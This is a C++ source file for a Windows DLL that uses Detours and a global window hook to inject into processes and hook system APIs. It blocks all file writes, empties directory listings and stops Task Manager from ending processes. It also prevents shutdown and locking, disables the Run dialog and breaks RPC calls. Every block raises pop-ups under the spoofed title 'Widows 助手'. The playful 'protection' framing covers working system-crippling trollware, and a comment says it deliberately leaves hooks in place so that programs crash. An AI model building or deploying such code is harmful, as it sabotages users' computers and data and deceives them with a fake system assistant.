// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#pragma comment (lib, "detours.lib")

BOOL IsApp(LPCSTR lpName) {
	char modName[MAX_PATH];
	GetModuleFileNameA(NULL, modName, MAX_PATH);
	char* p = strrchr(modName, '\\');
	
	return !strcmp(p + 1, lpName);
}

extern "C" __declspec(dllexport)
LRESULT WINAPI CALLBACK Hooker(int code, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(NULL, code, wParam, lParam);
}

HHOOK g_HookProc;

extern "C" __declspec(dllexport)
void EnableGlobalHook()
{
	g_HookProc = SetWindowsHookEx(WH_CBT, Hooker, GetModuleHandle(L"gt428_detours_x86.dll"), 0);
}

extern "C" __declspec(dllexport)
void DisableGlobalHook()
{
	UnhookWindowsHookEx(g_HookProc);
}

LPVOID WINAPI GetFunction(LPCSTR Dll, LPCSTR Func)
{
	HMODULE DllMod = GetModuleHandleA(Dll);
	return DllMod ? (LPVOID)GetProcAddress(DllMod, Func) : NULL;
}

VOID WINAPI InstallHook(LPCSTR Dll, LPCSTR Func, LPVOID* OriginalFunc, LPVOID HookedFunc)
{
	*OriginalFunc = GetFunction(Dll, Func);
	if (*OriginalFunc) DetourAttach(OriginalFunc, HookedFunc);
}

void UninstallHook(LPVOID OriginalFunc, LPVOID HookedFunc)
{
	if (OriginalFunc && HookedFunc) DetourDetach(&OriginalFunc, HookedFunc);
}


typedef
NTSTATUS
(WINAPI* __NtCreateFile)(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	PLARGE_INTEGER     AllocationSize,
	ULONG              FileAttributes,
	ULONG              ShareAccess,
	ULONG              CreateDisposition,
	ULONG              CreateOptions,
	PVOID              EaBuffer,
	ULONG              EaLength);

__NtCreateFile _NtCreateFile = NULL;

NTSTATUS
WINAPI
HookedNtCreateFile(
	PHANDLE            FileHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PIO_STATUS_BLOCK   IoStatusBlock,
	PLARGE_INTEGER     AllocationSize,
	ULONG              FileAttributes,
	ULONG              ShareAccess,
	ULONG              CreateDisposition,
	ULONG              CreateOptions,
	PVOID              EaBuffer,
	ULONG              EaLength)
{
	return _NtCreateFile(
		FileHandle,
		DesiredAccess,
		ObjectAttributes,
		IoStatusBlock,
		AllocationSize,
		FileAttributes,
		ShareAccess,
		CreateDisposition,
		CreateOptions,
		EaBuffer,
		EaLength
	);
}

typedef
NTSTATUS
(WINAPI* __NtWriteFile)(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PVOID			    ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN PVOID                Buffer,
	IN ULONG                Length,
	IN PLARGE_INTEGER       ByteOffset OPTIONAL,
	IN PULONG               Key OPTIONAL);

__NtWriteFile _NtWriteFile = NULL;

NTSTATUS
WINAPI
HookedNtWriteFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PVOID			    ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	IN PVOID                Buffer,
	IN ULONG                Length,
	IN PLARGE_INTEGER       ByteOffset OPTIONAL,
	IN PULONG               Key OPTIONAL)
{
	/* MEMZ 先写入MBR然后写入note.txt，一旦MBR无法修改就会产生大量报错框并蓝屏 */
	if (IsApp("MEMZ.exe")) {
		MessageBoxW(NULL, L"刚刚一只猫想要更改MBR，已经拦截了", L"Widows 助手", MB_ICONERROR);

	}
	else CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"电脑正在写入文件，已经帮您拦截了(●'◡'●)！", L"Widows 助手", MB_OK | MB_ICONERROR); return 0; }, NULL, 0, NULL);

	return STATUS_ACCESS_DENIED;
}

typedef
NTSTATUS
(WINAPI* __NtQueryDirectoryFile)(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PVOID				ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan);

__NtQueryDirectoryFile _NtQueryDirectoryFile = NULL;

NTSTATUS
WINAPI
HookedNtQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PVOID				ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan)
{
	NTSTATUS Status = _NtQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileMask,
		RestartScan);

	if (NT_SUCCESS(Status))
	{
		
		*(PULONG)FileInformation = 0;
	}
	return Status;
}

typedef
NTSTATUS
(WINAPI* __NtQueryDirectoryFileEx)(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PVOID				   ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG                  QueryFlags,
	PUNICODE_STRING        FileName);

__NtQueryDirectoryFileEx _NtQueryDirectoryFileEx = NULL;

NTSTATUS
WINAPI
HookedNtQueryDirectoryFileEx(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PVOID				   ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	ULONG                  QueryFlags,
	PUNICODE_STRING        FileName)
{
	NTSTATUS Status = _NtQueryDirectoryFileEx(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		QueryFlags,
		FileName);

	if (NT_SUCCESS(Status))
	{
		*(PULONG)FileInformation = 0;
		
	}
	return Status;
}

typedef
NTSTATUS
(NTAPI* __NtTerminateProcess)(
	HANDLE ProcessHandle,
	NTSTATUS ExitStatus);
__NtTerminateProcess _NtTerminateProcess = NULL;

NTSTATUS NTAPI HookedNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
	CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"有个程序TSK想终止它的同胞，这太残忍了！已经帮您拦截了(●'◡'●)！", L"Widows 助手", MB_OK | MB_ICONERROR| MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);
	return STATUS_ACCESS_DENIED;
}

typedef
BOOL
(WINAPI* __ExitWindowsEx)(
	UINT  uFlags,
	DWORD dwReason
);

__ExitWindowsEx _ExitWindowsEx = NULL;
BOOL WINAPI HookedExitWindowsEx(UINT uFlags, DWORD dwReason) {
	CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"刚刚电脑想关机（重启或注销），已经帮你取消了o(*^▽^*)┛", L"Widows 助手", MB_OK | MB_ICONERROR| MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);

	SetLastError(ERROR_PRIVILEGE_NOT_HELD);
	return FALSE;
}


typedef void (WINAPI* RUNFILEDLG)(
	HWND    hwndOwner,
	HICON   hIcon,
	LPCWSTR lpstrDirectory,
	LPCWSTR lpstrTitle,
	LPCWSTR lpstrDescription,
	UINT    uFlags);
RUNFILEDLG _RunFileDlg = NULL;

void WINAPI HookedRunFileDlg(HWND    hwndOwner,
	HICON   hIcon,
	LPCWSTR lpstrDirectory,
	LPCWSTR lpstrTitle,
	LPCWSTR lpstrDescription,
	UINT    uFlags) {
	CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"为了防止病毒，此电脑的运行功能已经被禁用", L"Widows 助手", MB_OK | MB_ICONERROR| MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);

}

typedef unsigned char* (WINAPI*__NdrSendReceive)(
	PMIDL_STUB_MESSAGE      pStubMsg,
	unsigned char* pBufferEnd
);

__NdrSendReceive _NdrSendReceive = NULL;

unsigned char*
WINAPI
HookedNdrSendReceive(
	PMIDL_STUB_MESSAGE      pStubMsg,
	unsigned char* pBufferEnd
) {
	
	/* 揪出下崽器 */
	MessageBox(NULL, L"我是下崽器", L"", MB_OK);
	CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"又是谁在高速下崽?已经帮你阻止", L"Widows 助手", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);
	return NULL;
}



typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem,
	OptionOkNoWait,
	OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;



typedef NTSTATUS (WINAPI* type_NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response);
type_NtRaiseHardError _NtRaiseHardError = NULL;
NTSTATUS WINAPI HookedNtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response) {
	if (ValidResponseOptions == OptionShutdownSystem) {
		CreateThread(NULL, 0, [](
			LPVOID lpThreadParameter
			)->DWORD {MessageBoxW(NULL, L"刚刚电脑想要蓝屏，已经帮你撤回了", L"Widows 助手", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);
		return STATUS_ACCESS_DENIED;
	}
	/* 不是蓝屏就正常调用，一般系统报错都会用这个函数 */
	return _NtRaiseHardError(ErrorStatus, NumberOfParameters, UnicodeStringParameterMask, Parameters, ValidResponseOptions, Response);
}

typedef BOOL(WINAPI* __LockWorkStation)(VOID);
__LockWorkStation _LockWorkStation = NULL;
BOOL WINAPI HookedLockWorkStation(VOID) {
	CreateThread(NULL, 0, [](
		LPVOID lpThreadParameter
		)->DWORD {MessageBoxW(NULL, L"刚刚电脑要锁屏了，已经帮你取消了", L"Widows 助手", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL); return 0; }, NULL, 0, NULL);

	SetLastError(ERROR_ACCESS_DENIED);
	return FALSE;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		/* Hook下载函数 注意：不确保所有下崽器都会调用这个 */
		InstallHook("rpcrt4.dll", "NdrSendReceive", (LPVOID*)&_NdrSendReceive, HookedNdrSendReceive);

		/* Hook 运行框 */
		InstallHook("shell32.dll", (LPCSTR)61, (LPVOID*)&_RunFileDlg, HookedRunFileDlg);
		/* Hook 关机 注:不拦截InitiateSystemShutdown，因此shutdown命令有效*/
		InstallHook("user32.dll", "ExitWindowsEx", (LPVOID*)&_ExitWindowsEx, HookedExitWindowsEx);
		/* Hook 锁定工作站（Win+L）*/
		InstallHook("user32.dll", "LockWorkStation", (LPVOID*)&_LockWorkStation, HookedLockWorkStation);
		
		/* Hook 写盘与获取文件列表 */
		InstallHook("ntdll.dll", "NtCreateFile", (LPVOID*)&_NtCreateFile, HookedNtCreateFile);
		InstallHook("ntdll.dll", "NtWriteFile", (LPVOID*)&_NtWriteFile, HookedNtWriteFile);
		InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID*)&_NtQueryDirectoryFile, HookedNtQueryDirectoryFile);
		InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID*)&_NtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);

		/* Hook 蓝屏（用户态）*/
		InstallHook("ntdll.dll", "NtRaiseHardError", (LPVOID*)&_NtRaiseHardError, HookedNtRaiseHardError);
		InstallHook("ntdll.dll", "ZwRaiseHardError", (LPVOID*)&_NtRaiseHardError, HookedNtRaiseHardError);
		/* 正常应用的退出需要这个终止进程函数 因此只拦截任务管理器 */
		if (IsApp("taskmgr.exe")) {
			InstallHook("ntdll.dll", "NtTerminateProcess", (LPVOID*)&_NtTerminateProcess, HookedNtTerminateProcess);
			
		}
		
		DetourTransactionCommit();
		break;
	case DLL_THREAD_ATTACH:
		break;
	/* 注意：脱附时故意不卸载函数Hook，会使一些程序崩溃 */
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}